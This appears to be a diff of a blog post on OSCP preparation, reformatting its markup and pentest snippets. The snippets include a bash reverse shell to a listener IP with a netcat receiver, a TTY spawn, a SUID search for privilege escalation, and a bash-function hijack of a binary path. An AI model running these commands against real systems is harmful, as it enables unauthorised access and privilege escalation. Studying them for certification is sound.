@@ -35,7 +35,10 @@ author:
   last_name: ''
 ---
 <p>Here's the second episode on my path to becoming OSCP certified.</p>
-<p>https://www.youtube.com/watch?v=lAyTP8YNGl4</p>
+<p><a href="https://www.youtube.com/watch?v=lAyTP8YNGl4">https://www.youtube.com/watch?v=lAyTP8YNGl4</a></p>
+<script>
+document.write('<iframe width="560" height="315" src="https://www.youtube.com/embed/lAyTP8YNGl4" frameborder="0" allowfullscreen></iframe>');
+</script>
 <h2>Related links</h2>
 <ul>
 <li><a href="https://www.vulnhub.com/">VulnHub</a></li>
@@ -45,22 +48,20 @@ author:
 </ul>
 <h2>Snippets</h2>
 <h3>Spawn TTY</h3>
-<pre>python -c 'import pty;pty.spawn("/bin/bash")'</pre>
+{% highlight python %}python -c 'import pty;pty.spawn("/bin/bash")'{% endhighlight %}
 <p>Related: <a href="http://unix.stackexchange.com/a/122624/43870">Why do you need tty for sudo</a></p>
 <h3>Redirect bash to tcp socket</h3>
-<pre>/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.107/6666 0&gt;&amp;1
+{% highlight bash %}/bin/bash -i >& /dev/tcp/192.168.0.107/6666 0>&1
 # then at receiver:
 nc -l -n -v -p 6666
-# And wait for incoming bash shell</pre>
+# And wait for incoming bash shell{% endhighlight %}
 <h3>Find SUID/SGUID files for privilege escalation</h3>
-<pre>find / -user root -perm -4000 -print 2&gt;/dev/null</pre>
+{% highlight bash %}find / -user root -perm -4000 -print 2>/dev/null{% endhighlight %}
 <p>Of course if you can somehow exploit these results, you might get root</p>
 <h3>Hijack a binary's full path in bash to exec your own code</h3>
-<pre>$ function /usr/bin/foo () { /usr/bin/echo "It works"; }
+{% highlight bash %}$ function /usr/bin/foo () { /usr/bin/echo "It works"; }
 $ export -f /usr/bin/foo
 $ /usr/bin/foo
 It works
-</pre>
-<p>Of course you might want this if a SUID bit programing is calling some binary by full path and you cannot alter that binary but want to hijack the execution</p>
-<p>&nbsp;</p>
-<p>.</p>
+{% endhighlight %}
+<p>Of course you might want this if a SUID bit programing is calling some binary by full path and you cannot alter that binary but want to hijack the execution.</p>
